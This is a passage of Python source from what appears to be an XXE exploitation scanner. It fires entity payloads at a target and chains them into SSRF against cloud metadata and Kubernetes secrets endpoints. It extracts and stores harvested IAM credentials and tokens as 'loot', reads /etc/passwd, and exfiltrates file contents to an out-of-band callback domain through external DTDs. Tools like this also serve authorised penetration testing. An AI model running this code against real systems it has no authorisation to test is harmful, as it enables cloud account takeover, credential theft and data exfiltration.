                f"XXE-SSRF-{provider.upper()}" if provider else "XXE-SSRF",
                "CRITICAL",
                "XXE-to-SSRF" + (f" cloud metadata ({provider})" if provider else ""),
                f"External entity resolved internal URL: {target_url}",
                "Cloud credential theft or internal network reconnaissance",
                payload, resp, elapsed,
                extra_evidence={**extra, "url": target_url},
                extra_reasons=reasons,
                mandatory_override=mandatory,
            )

    # -------------------------------------------------------------------
    # Cloud metadata — XXE -> SSRF -> Cloud credentials. This is the highest-impact XXE chain in 2026.
    # -------------------------------------------------------------------

    METADATA_PROVIDERS = [
        ("aws",     "http://169.254.169.254/latest/meta-data/",
         ["ami-id", "instance-id", "instance-type", "placement"],
         "CRITICAL", "AWS IMDSv1"),
        ("aws",     "http://169.254.169.254/latest/meta-data/iam/"
                    "security-credentials/",
         ["AccessKeyId", "SecretAccessKey", "Token", "iam"],
         "CRITICAL", "AWS IAM credentials"),
        ("aws",     "http://169.254.169.254/latest/user-data/",
         ["#cloud-config", "#!/", "cloud-init", "runcmd"],
         "HIGH", "AWS user-data"),
        ("gcp",     "http://metadata.google.internal/computeMetadata/"
                    "v1/instance/service-accounts/default/token",
         ["access_token", "expires_in", "token_type"],
         "CRITICAL", "GCP OAuth token"),
        ("gcp",     "http://metadata.google.internal/computeMetadata/"
                    "v1/project/project-id",
         ["project-id", "project_id"],
         "HIGH", "GCP project ID"),
        ("azure",   "http://169.254.169.254/metadata/instance"
                    "?api-version=2021-02-01",
         ["vmId", "subscriptionId", "resourceGroupName"],
         "HIGH", "Azure instance metadata"),
        ("azure",   "http://169.254.169.254/metadata/identity/oauth2/"
                    "token?api-version=2018-02-01"
                    "&resource=https://management.azure.com/",
         ["access_token", "expires_on", "token_type"],
         "CRITICAL", "Azure managed-identity token"),
        ("alibaba", "http://100.100.100.200/latest/meta-data/",
         ["instance-id", "region-id", "zone-id"],
         "HIGH", "Alibaba Cloud metadata"),
        ("alibaba", "http://100.100.100.200/latest/meta-data/ram/"
                    "security-credentials/",
         ["AccessKeyId", "AccessKeySecret", "SecurityToken"],
         "CRITICAL", "Alibaba RAM credentials"),
        ("oci",     "http://169.254.169.254/opc/v1/instance/",
         ["id", "displayName", "compartmentId", "region"],
         "HIGH", "Oracle Cloud metadata"),
        ("k8s",     "https://kubernetes.default.svc/api/v1/"
                    "namespaces/default/secrets/",
         ["kind", "items", "apiVersion", "metadata"],
         "CRITICAL", "Kubernetes secrets API"),
        ("k8s",     "https://kubernetes.default.svc/api/v1/"
                    "namespaces/kube-system/secrets/",
         ["kind", "items", "kube-system"],
         "CRITICAL", "Kubernetes kube-system secrets"),
    ]

    _CLOUD_METADATA_HOSTS = frozenset({
        "169.254.169.254",
        "metadata.google.internal",
        "100.100.100.200",
        "kubernetes.default.svc",
    })

    def _phase_cloud_metadata(self):
        for provider, url, keys, base_sev, label in self.METADATA_PROVIDERS:
            if self.ctx.expired():
                return

            payload = XXEPayloadGenerator.ssrf_entity(url)
            resp, elapsed = self._send(payload)
            if resp is None:
                continue

            body = resp.text or ""

            if (provider == "aws"
                    and resp.status_code == 401
                    and "token" in body.lower()):
                self.add_finding(
                    "XXE-CLOUD-METADATA-IMDSV2", "HIGH",
                    "AWS metadata reachable but IMDSv2 enforced",
                    "External entity reached 169.254.169.254 but the "
                    "service requires an IMDSv2 token. The SSRF "
                    "primitive exists; IMDSv2 can be bypassed via "
                    "request smuggling in some setups.",
                    "Partial SSRF — potential credential theft if "
                    "IMDSv2 is bypassed",
                    confirmed=True, exploitability="confirmed",
                    evidence={
                        "url": url,
                        "status": 401,
                        "response_snippet": body[:300],
                    },
                    reasons=["IMDS returned 401 with token requirement"],
                    confidence=45,
                )
                continue

            if self.accuracy.looks_like_markup(body):
                continue

            matched = [k for k in keys if k.lower() in body.lower()]
            if len(matched) < 2:
                continue

            url_slug = re.sub(r"[^a-z0-9]+", "-",
                              url.split("169.254.169.254")[-1]
                                 .split("metadata.google.internal")[-1]
                                 .split("100.100.100.200")[-1]
                                 .split("kubernetes.default.svc")[-1]
                              ).strip("-")[:40] or "root"
            fid = f"XXE-CLOUD-METADATA-{provider.upper()}-{url_slug}"
            sev = base_sev

            # Elevate to CRITICAL if the response contains credentials
            credential_markers = (
                "AccessKeyId", "SecretAccessKey", "SecurityToken",
                "access_token", "session_token", "private_key",
            )
            has_creds = any(m.lower() in body.lower()
                            for m in credential_markers)
            if has_creds:
                sev = "CRITICAL"
            extracted = CredentialExtractor.extract_all(
                body, source=f"{self.url} → {url}")
            extracted_dicts = [c.to_dict() for c in extracted]

            loot_ids: List[str] = []
            for cred in extracted:
                try:
                    loot_key = self.loot.add_secret(
                        target_url=self.url,
                        technique=fid,
                        kind=cred.kind,
                        raw=cred.raw,
                        fields=cred.fields,
                        snippets=cred.snippets,
                    )
                except Exception as e:
                    dbg(f"loot add_secret failed for {cred.kind}: {e!r}")
                    loot_key = None
                if loot_key:
                    loot_ids.append(loot_key)
                    entry = self.loot.get(loot_key)
                    if entry:
                        self._emit("loot", {"entry": entry})

            self.add_finding(
                fid, sev,
                f"XXE-to-SSRF exposes {label}",
                f"External entity resolved {url} and returned "
                f"{label} content. {len(matched)} provider-specific "
                f"indicator(s) matched.",
                ("Cloud account takeover via IAM credentials"
                 if has_creds else
                 "Cloud infrastructure reconnaissance"),
                confirmed=True, exploitability="confirmed",
                evidence={
                    "url": url,
                    "provider": provider,
                    "indicators": matched,
                    "credentials_exposed": has_creds,
                    "extracted_credentials": extracted_dicts,
                    "loot_ids": loot_ids,
                    "response_snippet": body[:400],
                    "score": 70 if has_creds else 55,
                },
                reasons=[
                    f"Cloud metadata '{provider}' matched "
                    f"({len(matched)} indicators)",
                    "Credentials present in response" if has_creds
                    else "Metadata service reachable",
                ],
                confidence=70 if has_creds else 55,
            )

    # -------------------------------------------------------------------
    # JSON-to-XML content-type switching
    # -------------------------------------------------------------------

    def _phase_json_to_xml(self):
        probe = XXEPayloadGenerator.json_probe_xml()
        resp, elapsed = self._send(probe, content_type="application/xml")
        if resp is None:
            return

        if resp.status_code == 415:
            dbg("  JSON-to-XML: endpoint rejects application/xml (415)")
            return

        baseline_match = self.accuracy.is_no_change(resp.text or "",
                                                    self.baseline)

        dbg(f"  JSON-to-XML: probe returned {resp.status_code}"
            + (" (matches baseline)" if baseline_match else ""))

        inner = ('<?xml version="1.0"?>'
                 '<!DOCTYPE root ['
                 '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
                 ']><root><test>&xxe;</test></root>')
        resp2, elapsed2 = self._send(inner, content_type="application/xml")
        if resp2 is None:
            return

        chain_ok = self._verify_entity_chain(inner, resp2)

        self._score_and_report(
            "XXE-JSON-TO-XML", "HIGH",
            "XXE via JSON-to-XML content-type switching",
            "Endpoint accepts application/xml alongside application/json "
            "(typical of Spring MVC with jackson-dataformat-xml, or any "
            "framework with an XML message converter auto-registered).",
            "File disclosure through a surface the API contract "
            "does not advertise",
            inner, resp2, elapsed2,
            chain_integrity=chain_ok,
            extra_evidence={
                "probe_status": resp.status_code,
                "probe_content_type": "application/xml",
                "probe_matched_baseline": baseline_match,
            },
            file_target="/etc/passwd",
        )

    # -------------------------------------------------------------------
    # XXE-to-RCE via language-specific protocol wrappers
    # -------------------------------------------------------------------

    def _phase_rce_wrappers(self):
        wrappers = [
            ("JAR",          XXEPayloadGenerator.java_jar_read(),
             "jar:file:// — Java archive reader"),
            ("DATA",         XXEPayloadGenerator.php_data_wrapper(),
             "data:// — PHP inline data"),
            ("PHAR",         XXEPayloadGenerator.php_phar_wrapper(),
             "phar:// — PHP object deserialisation"),
            ("GLOB",         XXEPayloadGenerator.php_glob_enum(),
             "glob:// — PHP directory enumeration"),
            ("COMPRESS-ZLIB", XXEPayloadGenerator.php_compress_zlib(),
             "compress.zlib:// — PHP zlib wrapper"),
        ]

        for label, payload, note in wrappers:
            if self.ctx.expired():
                return

            resp, elapsed = self._send(payload)
            if resp is None:
                continue

            body = resp.text or ""
            if self.accuracy.looks_like_markup(body):
                continue

            hits = 0
            markers = {
                "JAR":          ["Manifest-Version", "Main-Class",
                                 "Implementation-Title"],
                "DATA":         ["phpinfo", "<?php"],
                "PHAR":         ["phar", "unserialize", "__PHP_Incomplete_Class"],
                "GLOB":         ["/etc/", "/root/", "/usr/"],
                "COMPRESS-ZLIB": ["root:x:", "daemon:x:"],
            }.get(label, [])

            hits = sum(1 for m in markers if m in body)

            if hits >= 1:
                self.add_finding(
                    f"XXE-RCE-{label}", "CRITICAL",
                    f"XXE via {note}",
                    f"Protocol wrapper resolved — {note}. "
                    f"Potential path from XXE to code execution.",
                    "Remote code execution or arbitrary file access",
                    confirmed=True, exploitability="confirmed",
                    evidence={
                        "wrapper": label,
                        "markers_matched": hits,
                        "response_snippet": body[:300],
                        "score": 65,
                    },
                    reasons=[f"{label} wrapper resolved with "
                             f"{hits} marker(s)"],
                    confidence=65,
                )

    def _phase_error_based(self):
        run_local_dtd = True
        if self.fingerprint and self.fingerprint.capabilities:
            caps = self.fingerprint.capabilities
            could_not_fingerprint = all(v is False for v in caps.values())
            entity_works = any(
                caps.get(k) for k in (
                    "internal_entity",
                    "external_file",
                    "external_dtd",
                    "parameter_entity",
                    "dtd_allowed",
                )
            )
            if not (could_not_fingerprint or entity_works):
                dbg(f"Skipping error-based local-DTD loop — fingerprint "
                    f"reports no entity resolution: {caps}")
                run_local_dtd = False

        if run_local_dtd:
            for dtd_path, entity_names in _iter_local_dtds():
                if self.ctx.expired():
                    return
                for entity in entity_names:
                    payload = XXEPayloadGenerator.error_based_local_dtd(
                        dtd_path, entity_name=entity,
                    )
                    resp, elapsed = self._send(payload)
                    if resp is None:
                        continue
                    body = resp.text or ""
                    leaked = (("root:x:" in body or "daemon:x:" in body)
                            and not self.accuracy.looks_like_markup(body))
                    self._score_and_report(
                        "XXE-ERROR-BASED-LOCAL-DTD", "CRITICAL",
                        "Error-based XXE via local DTD reuse",
                        f"Parser error leaked via {dtd_path} (entity {entity})",
                        "File disclosure through error channel",
                        payload, resp, elapsed,
                        extra_evidence={
                            "leaked_content": leaked,
                            "dtd": dtd_path,
                            "entity": entity,
                        },
                        mandatory_override=leaked,
                        file_target="/etc/passwd",
                    )

        if self.ctx.expired():
            return
        payload = XXEPayloadGenerator.error_based_malformed()
        resp, elapsed = self._send(payload)
        if resp:
            body = resp.text or ""
            leaked = ("root:x:" in body
                    and not self.accuracy.looks_like_markup(body))
            self._score_and_report(
                "XXE-ERROR-BASED-MALFORMED", "CRITICAL",
                "Error-based XXE via malformed entity",
                "Parser error leaked file content",
                "Arbitrary file disclosure",
                payload, resp, elapsed,
                extra_evidence={"leaked_content": leaked},
                mandatory_override=leaked,
                file_target="/etc/passwd",
            )

    def _await_oob(self, fut: Future, hard_timeout: float) -> List[Dict]:
        try:
            return fut.result(timeout=hard_timeout) or []
        except Exception as e:
            dbg("OOB poll future error:", repr(e))
            return []

    def _send_oob_and_check(self, technique: str,
                            subdomain: str,
                            note: str,
                            payload,
                            content_type: str = "application/xml",
                            poll_timeout: Optional[float] = None,
                            hard_timeout: Optional[float] = None,
                            return_response: bool = False,
                            token: Optional[str] = None,
                            file_target: Optional[str] = None):
        if poll_timeout is None:
            poll_timeout = self.oob_poll_timeout
        if hard_timeout is None:
            hard_timeout = poll_timeout + 2.0

        if token is None:
            token = OOBClient.token_from_subdomain(subdomain)

        self.oob.record_observation(technique, subdomain, note)
        self._emit("oob_dispatch", {
            "technique": technique,
            "subdomain": subdomain,
            "note": note,
        })
        poll_future = self.oob.start_poll(token=token, timeout=poll_timeout)
        resp, elapsed = self._send(payload, content_type=content_type)
        if resp is not None:
            dbg(f"  OOB [{technique}] → {resp.status_code} "
                f"in {elapsed*1000:.0f}ms (callback {subdomain})")
        correlated = False
        if resp is None:
            warn(f"OOB send failed for {technique}; skipping await")
        else:
            hits = self._await_oob(poll_future, hard_timeout=hard_timeout)
            correlated = any(
                self.oob.validate_hit_specific(h, token) for h in hits
            )
            if correlated and file_target:
                try:
                    self._ingest_oob_exfil(
                        hits, technique, subdomain, file_target)
                except Exception as e:
                    dbg(f"OOB exfil ingest failed for {technique}: {e!r}")
            if getattr(self.oob, "auto_mode", False):
                self.oob.mark_observation_correlated(subdomain, correlated)

        if getattr(self.oob, "auto_mode", False):
            self._emit("oob_result", {
                "technique": technique,
                "subdomain": subdomain,
                "correlated": correlated,
            })

        if return_response:
            return correlated, resp, elapsed
        return correlated

    def _phase_oob(self):
        if not self.oob:
            return

        # DNS-only
        subdomain, token = self.oob.generate_correlated_subdomain("xxe-dns")
        payload = XXEPayloadGenerator.oob_dns_only(subdomain)
        if self._send_oob_and_check(
                "xxe-dns", subdomain,
                "DNS-only parameter entity (blind parser fingerprint)",
                payload):
            self.add_finding(
                "XXE-BLIND-OOB-DNS-CORRELATED", "CRITICAL",
                "Blind XXE confirmed via correlated DNS callback",
                "External entity resolution triggered crypto-validated "
                "OOB interaction",
                "Blind XXE — full exploitation possible",
                confirmed=True, exploitability="confirmed",
                evidence={
                    "callback": subdomain,
                    "token": token,
                    "score": 50,
                },
                reasons=["Correlated OOB callback received (token verified)"],
                confidence=50,
            )

        # External DTD
        subdomain2, token2 = self.oob.generate_correlated_subdomain("xxe-dtd")
        file_target = "/etc/passwd"

        if self.dtd_provider is not None and self.dtd_provider.enabled:
            _xml_placeholder, dtd_content = (
                XXEPayloadGenerator.oob_external_dtd(
                    dtd_url="PLACEHOLDER",
                    callback_domain=subdomain2,
                    file_path=file_target,
                )
            )
            try:
                dtd_url = self.dtd_provider.register(token2, dtd_content)
                exfil_active = True
            except Exception as e:
                dbg(f"DTD register failed for token {token2}: {e!r}")
                dtd_url = f"http://{subdomain2}/evil.dtd"
                exfil_active = False
            xml_payload, _ = XXEPayloadGenerator.oob_external_dtd(
                dtd_url=dtd_url,
                callback_domain=subdomain2,
                file_path=file_target,
            )
        else:
            xml_payload, _ = XXEPayloadGenerator.oob_external_dtd(
                dtd_url=f"http://{subdomain2}/evil.dtd",
                callback_domain=subdomain2,
                file_path=file_target,
            )
            exfil_active = False

        if self._send_oob_and_check(
                "xxe-dtd", subdomain2,
                "External DTD fetch (blind file exfiltration via DTD)",
                xml_payload,
                file_target=file_target if exfil_active else None):
            title = ("Blind XXE confirmed via correlated external DTD "
                     + ("fetch with exfiltration" if exfil_active
                        else "fetch"))
            reasons = ["Correlated external DTD fetch confirmed"]
            if exfil_active:
                reasons.append(
                    f"Target fetched scanner-hosted DTD and exfiltrated "
                    f"{file_target} to the callback channel"
                )
            evidence: Dict[str, Any] = {
                "callback": subdomain2,
                "token": token2,
                "exfil_active": exfil_active,
                "score": 50,
            }

            if exfil_active:
                for obs in self.oob.stats().get("observations", []):
                    if obs.get("subdomain") == subdomain2 and obs.get("loot_id"):
                        evidence["loot_id"] = obs["loot_id"]
                        preview = self.loot.preview(obs["loot_id"], 400)
                        if preview:
                            evidence["extracted_content_preview"] = preview
                        creds = self.loot.credentials(obs["loot_id"])
                        if creds:
                            evidence["extracted_credentials"] = creds
                        break

            self.add_finding(
                "XXE-BLIND-OOB-EXTERNAL-DTD-CORRELATED", "CRITICAL",
                title,
                "Server fetched external DTD from callback domain",
                ("File content recovered via OOB exfiltration"
                 if exfil_active else "Full data exfiltration possible"),
                confirmed=True, exploitability="confirmed",
                evidence=evidence,
                reasons=reasons,
                confidence=50,
            )

        # Parameter entity raw DNS
        subdomain3, token3 = self.oob.generate_correlated_subdomain("pe-dns")
        payload3 = XXEPayloadGenerator.parameter_entity_dns_raw(subdomain3)
        if self._send_oob_and_check(
                "pe-dns", subdomain3,
                "Parameter entity with raw DNS lookup",
                payload3):
            self.add_finding(
                "XXE-PARAMETER-ENTITY-OOB", "CRITICAL",
                "Blind XXE via parameter entity OOB",
                "Parameter entity resolution triggered out-of-band callback",
                "Blind XXE with parameter entity support",
                confirmed=True, exploitability="confirmed",
                evidence={
                    "callback": subdomain3,
                    "token": token3,
                    "score": 50,
                },
                reasons=["Correlated parameter entity callback confirmed"],
                confidence=50,
            )

    def _phase_cdata(self):
        if not self.oob:
            return

        subdomain, token = self.oob.generate_correlated_subdomain("cdata")
        file_target = "/etc/passwd"

        if self.dtd_provider is not None and self.dtd_provider.enabled:
            _xml_placeholder, dtd_content = (
                XXEPayloadGenerator.cdata_external_dtd(
                    dtd_url="PLACEHOLDER",
                    callback_domain=subdomain,
                    file_path=file_target,
                )
            )
            try:
                dtd_url = self.dtd_provider.register(token, dtd_content)
                exfil_active = True
            except Exception as e:
                dbg(f"CDATA DTD register failed for {token}: {e!r}")
                dtd_url = f"http://{subdomain}/cdata.dtd"
                exfil_active = False
            xml_payload, _ = XXEPayloadGenerator.cdata_external_dtd(
                dtd_url=dtd_url,
                callback_domain=subdomain,
                file_path=file_target,
            )
            exfil_active = True
        else:
            xml_payload, _ = XXEPayloadGenerator.cdata_external_dtd(
                dtd_url=f"http://{subdomain}/cdata.dtd",
                callback_domain=subdomain,
                file_path=file_target,
            )
            exfil_active = False

        if self._send_oob_and_check(
                "cdata", subdomain,
                "CDATA-wrapped file exfiltration via external DTD",
                xml_payload,
                file_target=file_target if exfil_active else None):
            evidence: Dict[str, Any] = {
                "callback": subdomain,
                "token": token,
                "exfil_active": exfil_active,
                "score": 50,
            }

            if exfil_active:
                for obs in self.oob.stats().get("observations", []):
                    if obs.get("subdomain") == subdomain and obs.get("loot_id"):
                        evidence["loot_id"] = obs["loot_id"]
                        preview = self.loot.preview(obs["loot_id"], 400)
                        if preview:
                            evidence["extracted_content_preview"] = preview
                        creds = self.loot.credentials(obs["loot_id"])
                        if creds:
                            evidence["extracted_credentials"] = creds
                        break

            self.add_finding(
                "XXE-CDATA-BYPASS-OOB", "CRITICAL",
                "Blind XXE with CDATA bypass confirmed",
                ("CDATA-wrapped file content exfiltrated via OOB"
                 if exfil_active else
                 "CDATA-wrapped exfiltration probe triggered a callback"),
                "File disclosure even with special characters",
                confirmed=True, exploitability="confirmed",
                evidence=evidence,
                reasons=["CDATA exfiltration triggered correlated callback"],
                confidence=50,
            )

    def _phase_encoding_bypass(self):
        candidates = [
            ("UTF-16",       XXEPayloadGenerator.utf16_classic()),
            ("UTF-7",        XXEPayloadGenerator.utf7_classic()),
            ("UCS-4",        XXEPayloadGenerator.ucs4_classic()),
            ("ALT-DOCTYPE",  XXEPayloadGenerator.alternate_doctype_classic()),
        ]
        for label, payload in candidates:
            if self.ctx.expired():
                return
            resp, elapsed = self._send(payload)
            if resp is None:
                continue
            body = resp.text or ""
            file_type, count = self.accuracy.detect_file_fingerprint(body)
            if (file_type and count >= 2
                    and "root:x:" in body
                    and not self.accuracy.looks_like_markup(body)):
                ev = self._loot_evidence(
                    "/etc/passwd", resp,
                    f"XXE-ENCODING-BYPASS-{label}",
                    base={
                        "encoding": label,
                        "file_type": file_type,
                        "score": 45,
                    },
                )
                self.add_finding(
                    f"XXE-ENCODING-BYPASS-{label}", "HIGH",
                    f"XXE via {label} encoding bypass",
                    f"{label}-encoded payload bypassed input filtering",
                    "WAF/input filter bypass leading to file disclosure",
                    confirmed=True, exploitability="confirmed",
                    evidence=ev,
                    reasons=[f"{label}-encoded XXE payload resolved"],
                    confidence=45,
                )

    def _phase_xinclude(self):
        for fpath in ["/etc/passwd", "/etc/hostname"]:
            if self.ctx.expired():
                return
            payload = XXEPayloadGenerator.xinclude_file(fpath)
            resp, elapsed = self._send(payload)
            if resp is None:
                continue
            body = resp.text or ""
            file_type, count = self.accuracy.detect_file_fingerprint(body)
            if (file_type and count >= 2
                    and not self.accuracy.looks_like_markup(body)):
                ev = self._loot_evidence(
                    fpath, resp, "XXE-XINCLUDE",
                    base={
                        "file": fpath,
                        "file_type": file_type,
                        "indicators_matched": count,
                        "score": 45,
                    },
                )
                self.add_finding(
                    "XXE-XINCLUDE", "CRITICAL",
                    "XInclude attack confirmed",
                    f"XInclude directive resolved file: {fpath}",
                    "File disclosure bypassing DOCTYPE restrictions",
                    confirmed=True, exploitability="confirmed",
                    evidence=ev,
                    reasons=[f"XInclude resolved {fpath} with {count} indicators"],
                    confidence=45,
                )
                break

        for target in ["http://169.254.169.254/latest/meta-data/",
                       "http://127.0.0.1:80/"]:
            if self.ctx.expired():
                return
            payload = XXEPayloadGenerator.xinclude_ssrf(target)
            resp, elapsed = self._send(payload)
            if resp is None:
                continue
            body = resp.text or ""
            provider, count = self.accuracy.detect_cloud_metadata(body)
            if (provider and count >= 2
                    and not self.accuracy.looks_like_markup(body)):
                self.add_finding(
                    "XXE-XINCLUDE-SSRF", "HIGH",
                    "XInclude SSRF confirmed",
                    f"XInclude resolved internal URL: {target}",
                    "Internal network reconnaissance",
                    confirmed=True, exploitability="confirmed",
                    evidence={
                        "url": target,
                        "provider": provider,
                        "score": 40,
                    },
                    reasons=[f"XInclude SSRF resolved {target}"],
                    confidence=40,
                )
                break

    def _phase_svg_upload(self):
        url_hint = any(k in self.url.lower() for k in
                       ("upload", "attach", "media", "image", "avatar", "file"))
        ct_hint = False
        if self.base_request:
            ct = self.base_request.get("headers", {}).get("Content-Type", "").lower()
            ct_hint = "multipart" in ct or "image/" in ct or "svg" in ct

        if not (self.svg_mode or url_hint or ct_hint):
            dbg(f"Skipping SVG phase — no URL hint, "
                f"no Content-Type hint, --svg not set")
            self.skipped_phases.append(
                ("svg", "no --svg and no upload-shaped URL"))
            return

        for fpath in ["/etc/passwd", "/etc/hostname"]:
            if self.ctx.expired():
                return
            payload = XXEPayloadGenerator.svg_xxe(fpath)
            resp, elapsed = self._send(payload, content_type="image/svg+xml")
            if resp is None:
                continue
            body = resp.text or ""
            file_type, count = self.accuracy.detect_file_fingerprint(body)
            if (file_type and count >= 2
                    and not self.accuracy.looks_like_markup(body)):
                ev = self._loot_evidence(
                    fpath, resp, "XXE-SVG-UPLOAD",
                    base={
                        "file": fpath,
                        "file_type": file_type,
                        "score": 45,
                    },
                )
                self.add_finding(
                    "XXE-SVG-UPLOAD", "CRITICAL",
                    "XXE via SVG upload confirmed",
                    f"SVG file with XXE resolved: {fpath}",
                    "File disclosure via image upload",
                    confirmed=True, exploitability="confirmed",
                    evidence=ev,
                    reasons=[f"SVG XXE resolved {fpath}"],
                    confidence=45,
                )
                break

    def _phase_saml_presig(self):
        url_hint = self.saml_mode or any(k in self.url.lower() for k in
                    ("saml", "sso", "adfs", "okta", "assertion",
                    "federation", "idp", "sts/", "sp/"))
        if not url_hint:
            dbg("Skipping SAML pre-signature phase — no SAML-shaped "
                "URL segment")
            self.skipped_phases.append(
                ("saml_presig", "no SAML-shaped URL segment"))
            return

        probe = XXEPayloadGenerator.saml_assertion_with_broken_signature()

        for ct in ("application/xml", "text/xml",
                   "application/samlassertion+xml"):
            if self.ctx.expired():
                return

            resp, elapsed = self._send(probe, content_type=ct)
            if resp is None:
                continue

            body = resp.text or ""
            status = resp.status_code

            parser_err, err_level = self.accuracy.detect_parser_error(body)
            parsed_xml = bool(parser_err and err_level in ("high", "medium"))
            accepted = (status == 200)

            if not (parsed_xml or accepted):
                dbg(f"SAML presig: content-type {ct} → {status} "
                    f"(no parse signal)")
                continue

            dbg(f"SAML presig: content-type {ct} → {status} "
                f"(parse signal: {'parser_error' if parsed_xml else 'accepted'})")

            xxe_payload = XXEPayloadGenerator.saml_xxe()
            resp2, elapsed2 = self._send(xxe_payload, content_type=ct)
            if resp2 is None:
                continue

            chain_ok = self._verify_entity_chain(xxe_payload, resp2)

            extra_evidence = {
                "probe_status": status,
                "probe_content_type": ct,
                "probe_signal": "parser_error" if parsed_xml else "accepted",
            }
            if parser_err:
                extra_evidence["probe_parser_error"] = parser_err

            self._score_and_report(
                "XXE-SAML-PRESIG", "HIGH",
                "SAML pre-signature XXE",
                "Endpoint parsed the SAML assertion body before "
                "verifying its signature. XML parsing happens before "
                "signature validation — the mandatory sequence of the "
                "SAML protocol — so an XXE construct inside the "
                "assertion reaches the parser regardless of whether "
                "authentication ultimately succeeds.",
                "File disclosure or SSRF via SAML assertion parsing, "
                "reachable without valid credentials",
                xxe_payload, resp2, elapsed2,
                chain_integrity=chain_ok,
                extra_evidence=extra_evidence,
                mandatory_override=parsed_xml,
                file_target="/etc/passwd",
            )
            break

    def _phase_saml_soap(self):
        envelopes = [
            ("SAML", XXEPayloadGenerator.saml_xxe(),
             ["application/samlassertion+xml",
              "application/xml",
              "text/xml"]),
            ("SOAP", XXEPayloadGenerator.soap_xxe(),
             ["application/soap+xml",
              "application/xml",
              "text/xml"]),
        ]

        for label, payload, content_types in envelopes:
            if self.ctx.expired():
                return
            for ct in content_types:
                if self.ctx.expired():
                    return
                resp, elapsed = self._send(payload, content_type=ct)
                if resp is None:
                    continue
                body = resp.text or ""
                file_type, count = self.accuracy.detect_file_fingerprint(body)
                if (file_type and count >= 2
                        and not self.accuracy.looks_like_markup(body)):
                    ev = self._loot_evidence(
                        "/etc/passwd", resp, f"XXE-{label}-ENVELOPE",
                        base={
                            "content_type": ct,
                            "file_type": file_type,
                            "score": 45,
                        },
                    )
                    self.add_finding(
                        f"XXE-{label}-ENVELOPE", "CRITICAL",
                        f"XXE in {label} envelope confirmed",
                        f"{label} XML envelope resolved external entity "
                        f"(content-type {ct})",
                        "File disclosure via SAML/SOAP injection",
                        confirmed=True, exploitability="confirmed",
                        evidence=ev,
                        reasons=[f"{label} envelope XXE resolved file "
                                 f"under {ct}"],
                        confidence=45,
                    )
                    break

    def _phase_timing_blind(self):
        if not self.timing_mode:
            dbg("Skipping timing phase — --timing not set")
            return

        payload = XXEPayloadGenerator.timing_probe_sleep()
        timings = []
        for _ in range(3):
            if self.ctx.expired():
                return
            resp, elapsed = self._send(payload)
            if resp is not None:
                timings.append(elapsed)
            time.sleep(0.5)

        if len(timings) < 2:
            return

        all_anomalous = all(
            self.baseline.is_timing_anomaly_confirmed(t) for t in timings
        )

        if all_anomalous:
            median_timing = statistics.median(timings)
            self.add_finding(
                "XXE-TIMING-BLIND", "HIGH",
                "Timing-based blind XXE observed (multi-sample)",
                f"Consistent timing anomaly across {len(timings)} samples — "
                f"corroborate via OOB callback or in-band evidence before "
                f"treating as proof",
                "Potential blind XXE via timing side-channel",
                confirmed=False, exploitability="potential",
                evidence={
                    "baseline_elapsed": round(self.baseline.median_elapsed, 3),
                    "timings": [round(t, 3) for t in timings],
                    "median_timing": round(median_timing, 3),
                    "score": 20,
                },
                reasons=[f"All {len(timings)} samples exceeded "
                         f"{TIMING_DELTA_RATIO}x baseline",
                         "Timing anomaly is circumstantial — confirm via "
                         "an independent channel"],
                confidence=20,
            )

    def _phase_custom(self):
        if len(self.custom_payloads) == 0:
            return
        for cp in self.custom_payloads:
            for fpath in ["/etc/passwd", "c:/windows/win.ini"]:
                if self.ctx.expired():
                    return
                callback = ""
                token = ""
                oob_hit = False
                oob_correlated = False

                if self.oob:
                    callback, token = self.oob.generate_correlated_subdomain(
                        f"custom-{cp.name}"
                    )

                rendered = cp.render(
                    file_target=fpath,
                    callback=callback,
                    domain=self.oob.server if self.oob else "",
                    url=self.url,
                    host=urlparse(self.url).hostname or "",
                )
                if not rendered.strip():
                    continue

                payload_bytes = cp.encode(rendered)

                if self.oob and callback:
                    oob_correlated, resp, elapsed = self._send_oob_and_check(
                        f"custom-{cp.name}", callback,
                        f"Custom payload '{cp.name}' with OOB callback",
                        payload_bytes,
                        return_response=True,
                    )
                    if resp is None:
                        continue
                else:
                    resp, elapsed = self._send(payload_bytes)
                    if resp is None:
                        continue

                chain_ok = self._verify_entity_chain(rendered, resp)
                oob_hit = oob_correlated

                self._score_and_report(
                    f"XXE-CUSTOM-{cp.name}", "HIGH",
                    f"Custom payload triggered XXE ({cp.name})",
                    f"User-supplied payload '{cp.name}' produced anomalous response",
                    "Potential XML external entity processing",
                    rendered, resp, elapsed,
                    oob_hit=oob_hit,
                    oob_correlated=oob_correlated,
                    chain_integrity=chain_ok,
                    extra_evidence={
                        "payload_name": cp.name,
                        "file": fpath,
                    },
                    file_target=fpath,
                )

    def _phase_content_type_matrix(self):
        payload = XXEPayloadGenerator.classic_file_read("/etc/passwd")
        content_types = [
            "application/xml",
            "text/xml",
            "application/xhtml+xml",
            "application/atom+xml",
            "application/rss+xml",
            "application/rdf+xml",
            "application/mathml+xml",
            "application/xslt+xml",
            "application/soap+xml",
        ]
        for ct in content_types:
            if self.ctx.expired():
                return
            resp, elapsed = self._send(payload, content_type=ct)
            if resp is None:
                continue
            chain_ok = self._verify_entity_chain(payload, resp)
            self._score_and_report(
                f"XXE-CONTENT-TYPE-{ct}", "HIGH",
                f"XXE under Content-Type: {ct}",
                f"Classic file-read payload resolved when sent with "
                f"Content-Type {ct}",
                "Arbitrary local file disclosure",
                payload, resp, elapsed,
                chain_integrity=chain_ok,
                extra_evidence={"content_type": ct},
                file_target="/etc/passwd",
            )

    def _phase_method_variation(self):
        payload = XXEPayloadGenerator.classic_file_read("/etc/passwd")
        for method in ("PUT", "PATCH"):
            if self.ctx.expired():
                return
            resp, elapsed = self._send(payload, method=method)
            if resp is None:
                continue
            chain_ok = self._verify_entity_chain(payload, resp)
            self._score_and_report(
                f"XXE-METHOD-{method}", "MEDIUM",
                f"XXE via HTTP {method}",
                f"Classic payload resolved when sent via {method}",
                "Arbitrary local file disclosure via non-POST method",
                payload, resp, elapsed,
                chain_integrity=chain_ok,
                extra_evidence={"method": method},
                file_target="/etc/passwd",
            )

    def _send_url(self, url: str,
                  method: str = "GET",
                  content_type: str = "application/xml") -> Tuple[Optional[httpx.Response], float]:
        if self.rate_limiter:
            self.rate_limiter.wait()

        headers = self._build_headers(content_type)

        if _debug_on():
            u = urlparse(url)
            qs = u.query
            if len(qs) > 96:
                qs = qs[:96] + "…"
            path = u.path or "/"
            suffix = f"?{qs}" if qs else ""
            dbg(f"  → {method} {path}{suffix} [{content_type}]")

